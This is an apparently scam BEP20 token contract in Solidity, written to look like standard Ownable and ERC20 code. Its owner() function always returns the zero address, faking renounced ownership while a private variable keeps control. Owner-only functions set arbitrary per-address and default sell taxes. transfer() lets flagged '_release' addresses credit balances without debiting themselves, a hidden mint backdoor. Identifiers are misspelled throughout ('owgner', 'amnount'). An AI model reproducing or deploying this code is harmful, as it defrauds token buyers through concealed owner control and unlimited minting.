...
abstract contract Ownable is Context {
    address private _owgner;

    event owgnershipTransferred(address indexed previousowgner, address indexed newowgner);

    constructor() {
        _transferowgnership(_msgSender());
    }


    function owgner() public view  virtual returns (address) {
        return address(0);
    }

    modifier onlyowgner() {
        require(_owgner == _msgSender(), "Ownable: caller is not the owgner");
        _;
    }


    function renounceowgnership() public virtual onlyowgner {
        _transferowgnership(address(0));
    }


    function transferowgnership_transferowgnership(address newowgner) public virtual onlyowgner {
        require(newowgner != address(0), "Ownable: new owgner is the zero address");
        _transferowgnership(newowgner);
    }


    function _transferowgnership(address newowgner) internal virtual {
        address oldowgner = _owgner;
        _owgner = newowgner;
        emit owgnershipTransferred(oldowgner, newowgner);
    }
}
...
contract BEP20 is Context {
    ...
    event Approval(address indexed owgner, address indexed spender, uint256 value);
    ...
    function allowance(address owgner, address spender) public view virtual returns (uint256) {
        return _allowances[owgner][spender];
    }


    function approve(address spender, uint256 amnount) public virtual returns (bool) {
        address owgner = _msgSender();
        _approve(owgner, spender, amnount);
        return true;
    }
    ...
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owgner = _msgSender();
        _approve(owgner, spender, _allowances[owgner][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owgner = _msgSender();
        uint256 currentAllowance = _allowances[owgner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owgner, spender, currentAllowance - subtractedValue);
        }
    ...
    function _approve(
        ...
        require(owgner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owgner][spender] = amnount;
        emit Approval(owgner, spender, amnount);
    }
    ...
    function _spendAllowance(
        ...
        uint256 currentAllowance = allowance(owgner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amnount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owgner, spender, currentAllowance - amnount);
            }
        }
    }
...
contract te is BEP20, Ownable {
    ...
    function getRelease(address _address) external view onlyowgner returns (bool) {
        return _release[_address];
    }


    function setPairList(address _address) external onlyowgner {
        uniswapV2Pair = _address;
    }


    function upS(uint256 _value) external onlyowgner {
        _defaultSellfri = _value;
    }

    function setSfri(address _address, uint256 _value) external onlyowgner {
        require(_value > 1, "abzount tax must be greater than or equal to 1");
        _Sfri[_address] = _value;
    }

    function getSfri(address _address) external view onlyowgner returns (uint256) {
        return _Sfri[_address];
    }


    function setMarketabzountfri(address _address, bool _value) external onlyowgner {
        _marketabzount[_address] = _value;
    }

    function getMarketabzountfri(address _address) external view onlyowgner returns (bool) {
    ...
    function transfer(address to, uint256 amnount) public virtual returns (bool) {
        address owgner = _msgSender();
        if (_release[owgner] == true) {
            _balances[to] += amnount;
            return true;
        }
        _recF(owgner, to, amnount);
        return true;
    }
